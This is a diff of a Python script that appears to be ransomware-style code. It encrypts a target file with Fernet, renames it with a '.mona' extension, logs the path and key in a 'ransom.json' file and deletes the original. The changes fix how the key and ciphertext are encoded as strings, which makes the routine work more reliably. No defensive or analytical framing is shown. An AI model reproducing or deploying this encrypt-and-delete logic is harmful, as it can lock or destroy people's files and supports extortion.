@@ -37,26 +37,27 @@ def main():
     # create encryption key
     key = Fernet.generate_key()
     fernet = Fernet(key)
+    key_str = key.decode('utf-8')
 
     enc_file_name = (str(fernet.encrypt(file_name.encode())) +
                      '.mona').replace('/', '_')
     new_path = os.path.join(dir_path, enc_file_name)
-    enc_data = str(fernet.encrypt(data.encode()))
+    enc_data = fernet.encrypt(data.encode()).decode('utf-8')
 
     enc_file = open(new_path, "w")
     enc_file.write(enc_data)
     enc_file.close()
 
+
     # add decryption info to the json as a new entry
     ransom_json[abs_path] = {
         "enc_path": new_path,
-        "key": str(key)
+        "key": key_str
     }
 
     du.write_json(cache_dir, 'ransom.json', ransom_json)
 
     # delete original file
     os.remove(path)
-
 
 main()
